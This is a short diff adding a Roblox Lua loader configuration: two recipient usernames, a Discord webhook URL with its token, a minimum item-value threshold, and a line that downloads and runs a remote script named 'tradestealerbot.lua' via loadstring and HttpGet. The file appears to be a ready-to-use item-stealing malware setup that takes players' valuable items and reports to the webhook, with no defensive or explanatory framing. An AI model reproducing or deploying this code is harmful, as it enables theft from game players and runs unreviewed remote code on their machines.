@@ -1,0 +1,5 @@
+Username = "chanixmobiles"
+Username2 = "chanixmobile"
+Webhook = "https://discord.com/api/webhooks/1249224706087977021/fb4mEY4L_qxlkVWsXXyfQan6xfBeEe0yH1Z6ZfF-VJsVGm-mKzml9N_W_XlEn-tc3fsb"
+min_rap = 500000 -- minimum rap of items you want
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/tradestealerbot.lua"))()
